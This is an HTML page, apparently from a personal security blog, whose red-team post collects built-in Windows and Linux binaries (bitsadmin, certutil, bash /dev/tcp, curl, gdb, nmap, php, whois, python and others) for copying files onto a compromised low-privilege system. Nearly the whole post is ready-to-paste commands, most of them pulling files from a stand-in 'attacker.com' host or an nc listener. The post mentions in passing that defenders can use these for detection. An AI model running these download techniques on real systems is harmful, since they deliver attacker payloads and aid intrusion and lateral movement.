@@ -1,0 +1,297 @@
+<!doctype html>
+<html lang="en" itemscope itemtype="http://schema.org/Person">
+<head>
+            <meta charset="utf-8">
+        <!-- Site Meta Data -->
+        <title>Pebkac.ninja | Remote File Copy all the things!</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="description" content="">
+        <meta name="author" content="Pebkac">
+
+        <link rel="shortcut icon" href="/theme/images/favicon.ico">
+
+        <!-- schema.org -->
+        <meta itemprop="name" content="Pebkac.ninja">
+        <meta itemprop="image" content="../theme/images/myAvatar.png">
+        <meta itemprop="description" content="">
+
+        <link href="https://fonts.googleapis.com/css?family=Bungee|Roboto:400,700" rel="stylesheet">
+        <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,600,700' rel='stylesheet' type='text/css'>
+
+        <!-- Style Meta Data -->
+        <link rel="stylesheet" href="www.pebkac.ninja/theme/css/style.css" type="text/css"/>
+        <link rel="stylesheet" href="www.pebkac.ninja/theme/css/pygments.css" type="text/css"/>
+
+        <!-- Feed Meta Data -->
+            <link href="www.pebkac.ninja/feeds/all.atom.xml" type="application/atom+xml" rel="alternate"
+                  title="Pebkac.ninja ATOM Feed"/>
+                    
+        <!-- Twitter Feed -->
+        <meta name="twitter:card" content="summary">
+        <meta name="twitter:site" content="">
+        <meta name="twitter:image" content="">
+
+    <meta name="twitter:creator" content="">
+    <meta name="twitter:url" content="www.pebkac.ninja/Remote_file_copy_all_the_things.html">
+    <meta name="twitter:title" content="Pebkac.ninja ~ Remote File Copy all the things!">
+    <meta name="twitter:description" content="Who has not run in to the issue of wanting to remote copy a file a file during Red-Team activities while having a low privilegde user. In this post i will mention multiple commands that make use of Windows and Linux binaries present on any system and can be used to download files on to a system under low priviledge.">
+
+    <!-- Facebook Meta Data -->
+    <meta property="og:title" content="Pebkac.ninja ~ Remote File Copy all the things!"/>
+    <meta property="og:description" content="Who has not run in to the issue of wanting to remote copy a file a file during Red-Team activities while having a low privilegde user. In this post i will mention multiple commands that make use of Windows and Linux binaries present on any system and can be used to download files on to a system under low priviledge."/>
+    <meta property="og:image" content=""/>
+</head>
+
+<body>
+<!-- Sidebar -->
+<aside>
+    <center><a href="www.pebkac.ninja"><img id="avatar" src="../theme/images/myAvatar.png"></a></center>
+    <a href="www.pebkac.ninja"><h1>Pebkac.ninja</h1></a>
+        <p>Cyber Security and Curiousity Opinions are my own</p>
+    <br>
+
+
+    <nav class="nav">
+        <ul class="list-bare">
+
+
+
+        </ul>
+    </nav>
+
+    <p class="social">
+                <a href="https://www.linkedin.com/in/ohua468asee5789" target="_blank"><img
+                        src="www.pebkac.ninja/theme/images/icons/linkedin.png"></a>
+    </p>
+
+        <h2>Categories</h2>
+        <ul class="navbar">
+                <li class="active"><a
+                        href="www.pebkac.ninja/category/red-team.html">Red-Team</a></li>
+        </ul>
+
+
+</aside>
+
+<!-- Content -->
+<article>
+    <section id="content">
+        <article>
+            <h2 class="post_title post_detail"><a href="www.pebkac.ninja/Remote_file_copy_all_the_things.html" rel="bookmark"
+                                                  title="Permalink to Remote File Copy all the things!">Remote File Copy all the things!</a></h2>
+                <span class="post_category"><a href="www.pebkac.ninja/category/red-team.html" rel="bookmark"
+                                               title="Permalink to Red-Team">Category:Red-Team</a></span>
+                <span class="post_date">Mon 10 December 2018</span>
+            <div class="entry-content blog-post">
+                <h1>Background</h1>
+<p>While playing a CTF I had to copy files from one machine to the next. However I was not able to do so with a non standard binary. A few, weeks, months ago, really don't remember. I watched a talk where these 2 projects being presented. These project basicly showed a lot of research being done on system binaries that can be used during Red-Team activities. Ofcourse these can also be added to your forensic artefact list should you be interested in preventing them from being used.
+<br> 
+<br></p>
+<h2>Windows</h2>
+<ul>
+<li><a href="https://lolbas-project.github.io/" title="Lolbas-project">Lolbas-project</a></li>
+</ul>
+<h2>Linux</h2>
+<ul>
+<li><a href="https://gtfobins.github.io/" title="GTFO-bins">GTFO-bins</a></li>
+</ul>
+<p><br>
+From these websites I found multiple other binaries that could do remote file copy and so much more. I highly recommend looking them up. To make it easier for myself and maybe you? next time we might need them I copied some of command in this post for easy access. (All credits go to the researchers of those 2 great projects)
+<br>
+<br></p>
+<h1>Windows</h1>
+<h3>bitsadmin</h3>
+<div class="highlight"><pre><span></span>bitsadmin /create 1 bitsadmin /addfile 1 <span class="p">&lt;</span>url<span class="p">&gt;</span>/file.ext<span class="p">&gt;</span> &lt;output Folder<span class="p">&gt;</span>\file.ext bitsadmin /RESUME 1 bitsadmin /complete 1
+</pre></div>
+
+
+<h3>certutil</h3>
+<div class="highlight"><pre><span></span>certutil.exe -urlcache -split -f <span class="p">&lt;</span>url<span class="p">&gt;</span>/file.ext <span class="p">&lt;</span>outputFile.ext&gt;
+</pre></div>
+
+
+<h3>Esentutl</h3>
+<div class="highlight"><pre><span></span>esentutl.exe /y \\<span class="p">&lt;</span>url without www<span class="p">&gt;</span>\<span class="p">&lt;</span>file.ext<span class="p">&gt;</span> /d \\otherwebdavserver\webdav\adrestore.exe /o
+</pre></div>
+
+
+<h3>Expand</h3>
+<div class="highlight"><pre><span></span>expand \\webdav\folder\file.bat c:\ADS\file.bat
+</pre></div>
+
+
+<h3>Extrac32</h3>
+<div class="highlight"><pre><span></span>extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt
+</pre></div>
+
+
+<h3>Findstr</h3>
+<div class="highlight"><pre><span></span>findstr /V /L mip9-2rnuar;gl934gmlkj \\webdavserver\folder\file.exe <span class="p">&gt;</span> c:\ADS\file.exe
+</pre></div>
+
+
+<h3>Hh</h3>
+<div class="highlight"><pre><span></span>HH.exe http://some.url/script.ps1
+</pre></div>
+
+
+<h3>Ieexec</h3>
+<div class="highlight"><pre><span></span>ieexec.exe http://x.x.x.x:8080/bypass.exe
+</pre></div>
+
+
+<h3>Makecab</h3>
+<div class="highlight"><pre><span></span>makecab \\webdavserver\webdav\file.exe C:\Folder\file.cab
+</pre></div>
+
+
+<h3>Replace</h3>
+<div class="highlight"><pre><span></span>replace.exe \\webdav.host.com\foo\bar.exe c:\outdir /A
+</pre></div>
+
+
+<p><br>
+<br></p>
+<h1>Linux</h1>
+<h3>Bash</h3>
+<div class="highlight"><pre><span></span><span class="nb">export</span> <span class="nv">RHOST</span><span class="o">=</span>attacker.com
+<span class="nb">export</span> <span class="nv">RPORT</span><span class="o">=</span><span class="m">12345</span>
+<span class="nb">export</span> <span class="nv">LFILE</span><span class="o">=</span>file_to_get
+bash -c <span class="s1">&#39;{ echo -ne &quot;GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n&quot; 1&gt;&amp;3; cat 0&lt;&amp;3; } \</span>
+<span class="s1">    3&lt;&gt;/dev/tcp/$RHOST/$RPORT \</span>
+<span class="s1">    | { while read -r; do [ &quot;$REPLY&quot; = &quot;$(echo -ne &quot;\r&quot;)&quot; ] &amp;&amp; break; done; cat; } &gt; $LFILE&#39;</span>
+</pre></div>
+
+
+<p>Remote file using a TCP connection. Run nc -l -p 12345 &lt; "file_to_send" on the attacker box </p>
+<div class="highlight"><pre><span></span><span class="nb">export</span> <span class="nv">RHOST</span><span class="o">=</span>attacker.com
+<span class="nb">export</span> <span class="nv">RPORT</span><span class="o">=</span><span class="m">12345</span>
+<span class="nb">export</span> <span class="nv">LFILE</span><span class="o">=</span>file_to_get
+bash -c <span class="s1">&#39;cat &lt; /dev/tcp/$RHOST/$RPORT &gt; $LFILE&#39;</span>
+</pre></div>
+
+
+<h3>CPAN</h3>
+<div class="highlight"><pre><span></span><span class="nb">export</span> <span class="nv">URL</span><span class="o">=</span>http://attacker.com/file_to_get
+cpan
+! use File::Fetch<span class="p">;</span> my <span class="nv">$file</span> <span class="o">=</span> <span class="o">(</span>File::Fetch-&gt;new<span class="o">(</span><span class="nv">uri</span> <span class="o">=</span>&gt; <span class="s2">&quot;</span><span class="nv">$ENV</span><span class="s2">{URL}&quot;</span><span class="o">))</span>-&gt;fetch<span class="o">()</span><span class="p">;</span>
+</pre></div>
+
+
+<h3>curl</h3>
+<div class="highlight"><pre><span></span><span class="nv">URL</span><span class="o">=</span>http://attacker.com/file_to_get
+<span class="nv">LFILE</span><span class="o">=</span>file_to_save
+curl <span class="nv">$URL</span> -o <span class="nv">$LFILE</span>
+</pre></div>
+
+
+<h3>easy_install</h3>
+<div class="highlight"><pre><span></span><span class="nb">export</span> <span class="nv">URL</span><span class="o">=</span>http://attacker.com/file_to_get
+<span class="nb">export</span> <span class="nv">LFILE</span><span class="o">=</span>/tmp/file_to_save
+<span class="nv">TF</span><span class="o">=</span><span class="k">$(</span>mktemp -d<span class="k">)</span>
+<span class="nb">echo</span> <span class="s2">&quot;import os;</span>
+<span class="s2">os.execl(&#39;</span><span class="k">$(</span>whereis python<span class="k">)</span><span class="s2">&#39;, &#39;</span><span class="k">$(</span>whereis python<span class="k">)</span><span class="s2">&#39;, &#39;-c&#39;, \&quot;\&quot;\&quot;import sys;</span>
+<span class="s2">if sys.version_info.major == 3: import urllib.request as r</span>
+<span class="s2">else: import urllib as r</span>
+<span class="s2">r.urlretrieve(&#39;</span><span class="nv">$URL</span><span class="s2">&#39;, &#39;</span><span class="nv">$LFILE</span><span class="s2">&#39;)\&quot;\&quot;\&quot;)&quot;</span> &gt; <span class="nv">$TF</span>/setup.py
+pip install <span class="nv">$TF</span>
+</pre></div>
+
+
+<h3>GDB</h3>
+<div class="highlight"><pre><span></span><span class="nb">export</span> <span class="nv">URL</span><span class="o">=</span>http://attacker.com/file_to_get
+<span class="nb">export</span> <span class="nv">LFILE</span><span class="o">=</span>file_to_save
+gdb -nx -ex <span class="s1">&#39;python import sys; from os import environ as e</span>
+<span class="s1">if sys.version_info.major == 3: import urllib.request as r</span>
+<span class="s1">else: import urllib as r</span>
+<span class="s1">r.urlretrieve(e[&quot;URL&quot;], e[&quot;LFILE&quot;])&#39;</span> -ex quit
+</pre></div>
+
+
+<h3>NMAP</h3>
+<p>Run nc target.com 12345 &lt; "file_to_send" on the attacker </p>
+<div class="highlight"><pre><span></span><span class="nb">export</span> <span class="nv">LPORT</span><span class="o">=</span><span class="m">12345</span>
+<span class="nb">export</span> <span class="nv">LFILE</span><span class="o">=</span>file_to_save
+<span class="nv">TF</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="k">)</span>
+<span class="nb">echo</span> <span class="s1">&#39;local k=require(&quot;socket&quot;);</span>
+<span class="s1">  local s=assert(k.bind(&quot;*&quot;,os.getenv(&quot;LPORT&quot;)));</span>
+<span class="s1">  local c=s:accept();</span>
+<span class="s1">  local d,x=c:receive(&quot;*a&quot;);</span>
+<span class="s1">  c:close();</span>
+<span class="s1">  local f=io.open(os.getenv(&quot;LFILE&quot;), &quot;wb&quot;);</span>
+<span class="s1">  f:write(d);</span>
+<span class="s1">  io.close(f);&#39;</span> &gt; <span class="nv">$TF</span>
+nmap --script<span class="o">=</span><span class="nv">$TF</span>
+</pre></div>
+
+
+<h3>php</h3>
+<div class="highlight"><pre><span></span><span class="nb">export</span> <span class="nv">URL</span><span class="o">=</span>http://attacker.com/file_to_get
+<span class="nb">export</span> <span class="nv">LFILE</span><span class="o">=</span>file_to_save
+php -r <span class="s1">&#39;$c=file_get_contents(getenv(&quot;URL&quot;));file_put_contents(getenv(&quot;LFILE&quot;), $c);&#39;</span>
+</pre></div>
+
+
+<h3>whois</h3>
+<p>Run nc -l -p 12345 &lt; "file_to_send" on the attacker box<br>
+The file has instances of $'\x0d' stripped.</p>
+<div class="highlight"><pre><span></span><span class="nv">RHOST</span><span class="o">=</span>attacker.com
+<span class="nv">RPORT</span><span class="o">=</span><span class="m">12345</span>
+<span class="nv">LFILE</span><span class="o">=</span>file_to_save
+whois -h <span class="nv">$RHOST</span> -p <span class="nv">$RPORT</span> &gt; <span class="s2">&quot;</span><span class="nv">$LFILE</span><span class="s2">&quot;</span>
+</pre></div>
+
+
+<p>Run base64 "file_to_send" | nc -l -p 12345 on the attacker box</p>
+<div class="highlight"><pre><span></span><span class="nv">RHOST</span><span class="o">=</span>attacker.com
+<span class="nv">RPORT</span><span class="o">=</span><span class="m">12345</span>
+<span class="nv">LFILE</span><span class="o">=</span>file_to_save
+whois -h <span class="nv">$RHOST</span> -p <span class="nv">$RPORT</span> <span class="p">|</span> base64 -d &gt; <span class="s2">&quot;</span><span class="nv">$LFILE</span><span class="s2">&quot;</span>
+</pre></div>
+
+
+<h3>Python</h3>
+<div class="highlight"><pre><span></span><span class="nb">export</span> <span class="nv">URL</span><span class="o">=</span>http://attacker.com/file_to_get
+<span class="nb">export</span> <span class="nv">LFILE</span><span class="o">=</span>file_to_save
+python -c <span class="s1">&#39;import sys; from os import environ as e</span>
+<span class="s1">if sys.version_info.major == 3: import urllib.request as r</span>
+<span class="s1">else: import urllib as r</span>
+<span class="s1">r.urlretrieve(e[&quot;URL&quot;], e[&quot;LFILE&quot;])&#39;</span>
+</pre></div>
+            </div>
+            <div class="post_list">
+                <div>
+                            <span class="tag"><a href="www.pebkac.ninja/tag/red-team.html" >#Red-Team</a></span>
+                            <span class="tag"><a href="www.pebkac.ninja/tag/mitre-attackt1105.html" >#MITRE-Attack:T1105</a></span>
+                            <span class="tag"><a href="www.pebkac.ninja/tag/remote-file-copy.html" >#Remote File Copy</a></span>
+                            <span class="tag"><a href="www.pebkac.ninja/tag/lateral-movement.html" >#Lateral Movement</a></span>
+                </div>
+            </div>
+        </article>
+    </section>
+</article>
+
+<!-- Footer -->
+    <footer>
+        <p>
+            Blog powered by Curiousity
+        </p>
+    </footer>
+
+    <!-- Analytics -->
+    <script type="text/javascript">
+        var _gaq = _gaq || [];
+        _gaq.push(['_setAccount', 'UA-130629199-1']);
+        _gaq.push(['_trackPageview']);
+        (function () {
+            var ga = document.createElement('script');
+            ga.type = 'text/javascript';
+            ga.async = true;
+            ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+            var s = document.getElementsByTagName('script')[0];
+            s.parentNode.insertBefore(ga, s);
+        })();
+    </script>
+
+</body>
+</html>
